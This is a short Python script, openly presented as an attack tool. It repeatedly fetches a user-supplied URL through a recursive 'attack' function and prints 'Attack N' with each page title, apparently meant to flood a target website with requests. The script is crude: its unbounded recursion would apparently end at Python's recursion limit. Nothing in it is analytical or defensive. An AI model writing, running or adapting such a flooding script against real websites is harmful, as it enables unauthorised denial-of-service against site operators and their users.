#!/usr/bin/python3

# MIT License
# 
# Copyright (c) 2021 gh0$t
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

############################################################################################################################
# imports
############################################################################################################################
import sys
import urllib.request
from bs4 import BeautifulSoup

############################################################################################################################
# Pass URL and keep requesting it
############################################################################################################################
URL = str(sys.argv[1])
counter = 0
print('\n____________________________________________________\n\n', 'Attacking ->', URL, '\n____________________________________________________\n')
def attack(counter):
	counter += 1
	title = BeautifulSoup(urllib.request.urlopen(URL).read(), 'html.parser').find('title')
	print('Attack', counter, '->', title.text, '\n')
	attack(counter)
attack(counter)
